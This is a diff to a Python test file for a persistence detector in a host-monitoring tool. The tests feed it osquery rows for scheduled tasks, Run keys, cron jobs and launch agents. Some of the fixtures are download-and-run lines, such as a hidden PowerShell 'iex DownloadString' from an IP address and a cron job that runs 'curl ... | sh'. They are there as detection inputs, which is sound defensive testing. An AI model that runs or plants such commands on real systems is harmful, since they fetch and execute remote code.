@@ -7,13 +7,16 @@ from conftest import T0, conn, dns
 
 from tapwatch import config, detectors, zeek
 from tapwatch.hostrules import (
+    DUMP_MIN,
     NAMES,
     AppSpawnsShell,
     BadSignatureConnects,
     EncodedCommand,
     EndpointState,
     LolbinConnects,
+    NewPersistence,
     TempFolderConnects,
+    _entry_key,
     build,
     folder_class,
 )
@@ -86,6 +89,7 @@ def no_paths(case):
     """A case carries program names (as indicators) and folder classes, never a path or a command line."""
     text = json.dumps(case.facts) + json.dumps(case.indicators)
     assert "C:\\\\" not in text and "<user>" not in text and "cmdline" not in text, text
+    assert "/" not in case.facts.get("entry", "")   # an entry name is never a file path
     assert case.indicators and case.host == PC and case.facts["source"] == "endpoint"
 
 
@@ -443,3 +447,134 @@ def test_pipeline_routes_host_cases_by_code_without_jev_or_host_context(tmp_path
     assert row["reason"] == "always-alert rule" and "On the PC itself" in row["state"]
     assert p.process(connect(T0 + 60, r"C:\Windows\System32\certutil.exe", guid="{g2}")) == []   # counted, not re-sent
     assert p.store.get(cid)["hits"] == 2
+
+
+# ------------------------------------------------------------ R23 new persistence entry
+
+def persist(t, query, change="added", **cols):
+    """One differential row of a persistence query, logged when the hourly query ran at `t`."""
+    return {"_type": "osquery", "name": query, "unixTime": int(t), "ts": int(t), "action": change, "columns": cols}
+
+
+def task(t, name, action, change="added"):
+    return persist(t, "scheduled_tasks", change, name=name, action=action, path="\\" + name, enabled="1",
+                   last_run_time=str(int(t)))
+
+
+def tick(t):
+    return {"_type": "tick", "ts": t}
+
+
+def settle(det, *recs, at=None):
+    """Feed the rows, then a tick two minutes later so the batch is read."""
+    last = max(float(r.get("ts") or 0) for r in recs)
+    return run(det, *recs, tick((at or last) + 130))
+
+
+def test_new_task_running_a_script_from_downloads_alerts_and_carries_no_path():
+    (c,) = settle(NewPersistence(st()), task(T0, "Updater", r'powershell.exe -File C:\Users\<user>\Downloads\up.ps1'))
+    assert c.base_severity == 4 and c.detector == "host_persist" and c.indicators == ["powershell.exe"]
+    assert c.facts["kind"] == "scheduled task" and c.facts["entry"] == "Updater" and c.facts["folder"] == "downloads"
+    assert c.facts["script"] and c.facts["shell"] and c.facts["signals"] == []
+    no_paths(c)
+    (enc,) = settle(NewPersistence(st()), task(T0, "Sync", "powershell.exe -enc " + "Q" * 40))
+    assert enc.base_severity == 4 and enc.facts["signals"] == ["an encoded or download-and-run command"]
+
+
+def test_scripts_shells_and_user_folders_are_digest_items_once_a_week():
+    # the measured day's shapes: the owner's .vbs in the Startup folder, OneDrive's RunOnce that runs cmd.exe
+    det = NewPersistence(st())
+    vbs = persist(T0, "startup_items", name="keep-wsl.vbs", path=r"C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\keep-wsl.vbs",
+                  args="", source=r"C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup", status="enabled", username="u")
+    once = persist(T0, "startup_items", name="Delete Cached Update Binary", path=r"C:\WINDOWS\system32\cmd.exe",
+                   args="/q /c del /q cache.exe", source=r"HKEY_USERS\S-1-5-21-1-2-3-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
+                   status="enabled", username="u")
+    a, b = settle(det, vbs, once)
+    assert (a.base_severity, a.facts["kind"], a.facts["script"], a.facts["registry"]) == (3, "startup item", True, False)
+    assert (b.base_severity, b.facts["shell"], b.facts["registry"], b.indicators) == (3, True, True, ["cmd.exe"])
+    for c in (a, b):
+        no_paths(c)
+    # the same entry re-created by the next update (a new GUID, a new version in the name) is the same digest line
+    again = dict(once, unixTime=int(T0) + 7200, ts=int(T0) + 7200)
+    again["columns"] = dict(once["columns"], name="Delete Cached Update Binary 26.183.0920.0005")
+    assert settle(det, again) == []
+    assert _entry_key("msedge_cleanup_{C50565E9-CCCF-44B4-BA15-5AC5C6569197}") == "msedge_cleanup"
+    assert _entry_key("cbdhsvc_e46a2") == "cbdhsvc" and _entry_key("OneDrive Startup Task-S-1-5-21-867515037-1001") == "onedrive startup task"
+
+
+def test_installed_programs_changes_inventories_and_warmup_raise_nothing():
+    det = NewPersistence(st())
+    # Windows' own: usoclient under %systemroot%, a per-user svchost service, a task with no action
+    quiet = [task(T0, "Schedule Work", r" %systemroot%\system32\usoclient.exe StartWork"),
+             persist(T0, "auto_start_services", name="cbdhsvc_7a142", display_name="Clipboard User Service",
+                     path=r"C:\WINDOWS\system32\svchost.exe -k ClipboardSvcGroup -p", module_path="", user_account="LocalSystem"),
+             task(T0, "SoftLandingDeferralTask-{e35fd6a0-ee4d-41d0-ac6e-69f3f6b9d159}", "")]
+    assert settle(det, *quiet) == []
+    # a task that ran: removed + added in one run because last_run_time changed, even for a script
+    ran = [task(T0 + 3600, "Backup", r"wscript.exe C:\Users\<user>\backup.vbs", "removed"),
+           task(T0 + 3600, "Backup", r"wscript.exe C:\Users\<user>\backup.vbs")]
+    assert settle(det, *ran) == []
+    # ... but the same script task appearing without a removed partner is new
+    assert len(settle(det, task(T0 + 7200, "Backup2", r"wscript.exe C:\Users\<user>\backup2.vbs"))) == 1
+    # an inventory: the first run after the agent's database was reset lists everything as added
+    dump = [task(T0 + 10800, f"T{i}", rf"wscript.exe C:\Users\<user>\t{i}.vbs") for i in range(DUMP_MIN)]
+    assert settle(det, *dump) == []
+    # during warm-up everything is learned, and it stays learned after a restart
+    from tapwatch.detectors import Warmup, decode, encode
+    w = Warmup(600)
+    learning = NewPersistence(st(), warmup=w)
+    assert settle(learning, task(T0, "Learned", r"wscript.exe C:\Users\<user>\x.vbs")) == []
+    saved = {k: decode(v) for k, v in json.loads(json.dumps(learning.snapshot())).items()}
+    restarted = NewPersistence(st(), warmup=Warmup(0))
+    restarted.restore(learning.snapshot())
+    assert settle(restarted, task(T0 + 1000, "Learned", r"wscript.exe C:\Users\<user>\x.vbs")) == []   # known
+    assert len(settle(restarted, task(T0 + 1000, "Fresh", r"wscript.exe C:\Users\<user>\y.vbs"))) == 1
+    assert "known" in saved and encode(restarted.known)
+
+
+def test_cron_and_launch_agents_use_posix_folders():
+    cron = persist(T0, "crontab", event="", minute="*/5", hour="*", day_of_month="*", month="*", day_of_week="*",
+                   command="/usr/bin/python3 /home/u/sync.py", path="/var/spool/cron/crontabs/u")
+    (c,) = settle(NewPersistence(st()), cron)
+    assert c.facts["kind"] == "cron job" and c.facts["script"] and c.facts["folder"] == "profile" and c.base_severity == 3
+    assert c.facts["entry"] == "a user's crontab" and "/u" not in json.dumps(c.facts)   # the file path names the user
+    sys_cron = persist(T0, "crontab", event="", minute="0", hour="3", day_of_month="*", month="*", day_of_week="*",
+                       command="/opt/backup/run.sh", path="/etc/cron.d/backup")
+    assert settle(NewPersistence(st()), sys_cron)[0].facts["entry"] == "backup"
+
+
+def test_run_key_payloads_without_a_drive_letter_still_alert():
+    # review of #137: a Run key's value is often a bare `powershell -nop -w hidden -c iex (...)` or `mshta http://...`
+    det = NewPersistence(st())
+    rows = [persist(T0, "startup_items", name="Updater", path="powershell -nop -w hidden -c iex (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')",
+                    args="", source=r"HKEY_USERS\\S-1-5-21-1-2-3-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", status="enabled", username="u"),
+            persist(T0, "startup_items", name="Helper", path=r"cmd /c start C:\\Users\\<user>\\Downloads\\x.exe", args="",
+                    source=r"HKEY_USERS\\S-1-5-21-1-2-3-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", status="enabled", username="u"),
+            persist(T0, "startup_items", name="Loader", path="rundll32 x.dll,Entry", args="",
+                    source=r"HKEY_USERS\\S-1-5-21-1-2-3-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", status="enabled", username="u")]
+    enc, dl, ld = settle(det, *rows)
+    assert (enc.base_severity, enc.facts["program"], enc.facts["signals"]) == (4, "powershell.exe", ["an encoded or download-and-run command"])
+    assert (dl.base_severity, dl.facts["program"], dl.facts["folder"]) == (4, "cmd.exe", "downloads")
+    assert (ld.base_severity, ld.facts["program"], ld.facts["shell"]) == (3, "rundll32.exe", True)
+    for c in (enc, dl, ld):
+        no_paths(c)
+    assert _entry_key("update_added") == "update_added" and _entry_key("backup_cache") == "backup_cache"
+
+
+def test_a_corrupted_saved_known_set_is_discarded_at_restore():
+    import pytest
+    for bad in ({"known": "junk"}, {"known": {"$items": [[["a"], 1.0]]}}):
+        with pytest.raises(ValueError):
+            NewPersistence(st()).restore(bad)
+    tmp = persist(T0, "crontab", event="@reboot", minute="", hour="", day_of_month="", month="", day_of_week="",
+                  command="/tmp/.x/run.sh", path="/var/spool/cron/crontabs/u")
+    (bad,) = settle(NewPersistence(st()), tmp)
+    assert bad.base_severity == 4 and bad.facts["folder"] == "temp"
+    pipe = persist(T0, "crontab", event="", minute="0", hour="*", day_of_month="*", month="*", day_of_week="*",
+                   command="curl -s https://203.0.113.5/x | sh", path="/var/spool/cron/crontabs/u")
+    (dl,) = settle(NewPersistence(st()), pipe)
+    assert dl.base_severity == 4 and dl.facts["signals"] and dl.facts["url"]
+    agent = persist(T0, "launchd_run_at_load", label="com.example.helper", program="/Users/u/Library/helper.sh",
+                    program_arguments="", path="/Users/u/Library/LaunchAgents/com.example.helper.plist")
+    (la,) = settle(NewPersistence(st()), agent)
+    assert la.facts["kind"] == "launch agent" and la.facts["entry"] == "com.example.helper" and la.facts["folder"] == "profile"
